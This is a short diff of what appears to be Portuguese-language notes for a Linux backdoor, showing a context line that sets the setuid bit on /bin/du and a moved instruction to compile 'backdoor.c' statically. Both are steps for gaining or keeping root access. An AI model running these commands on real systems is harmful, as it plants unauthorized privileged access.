@@ -7,5 +7,6 @@ chmod +s /bin/du<br>
 
 # Para remover:
 Apenas faça o processo inverso ;-;
+# ----------------------------------------
+Compile com: gcc backdoor.c -o backdoor -static
 
-# Compile com: gcc backdoor.c -o backdoor -static
